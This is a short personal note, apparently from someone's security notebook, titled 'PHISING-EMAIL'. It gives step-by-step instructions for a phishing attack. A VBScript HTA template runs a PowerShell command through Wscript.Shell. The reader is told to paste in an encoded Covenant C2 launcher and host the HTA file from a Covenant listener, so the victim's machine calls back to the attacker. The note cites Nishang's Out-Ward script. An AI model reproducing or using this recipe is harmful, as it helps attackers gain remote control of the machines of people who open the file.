---
title: PHISING-EMAIL
updated: 2023-11-03 06:15:29Z
created: 2023-11-03 05:46:14Z
latitude: -33.86881970
longitude: 151.20929550
altitude: 0.0000
---

## OUT-WARD
From Nishang
Out-Ward.ps1

1. Create **file.hta** file

```
<script language="VBScript">
  Function DoStuff()
    Dim wsh
	Set wsh = CreateObject("Wscript.Shell")
	wsh.run "<powershell command here>"
	Set wsh = Nothing
  End Function
  DoStuff
  self.close
</script>
```
    

2. In Covenant, generate a **Listener**
3. Go to **Launchers** , **Powershell Launcher** , and click **Generate**
4. Copy the Encoded launcher and paste into the `"<powshell command here>"` section of **file.hta**
5. In Covenant, go to **Listeners** , click listener and add Hosted File
6. Set the **Path** and choose the **file.hta**
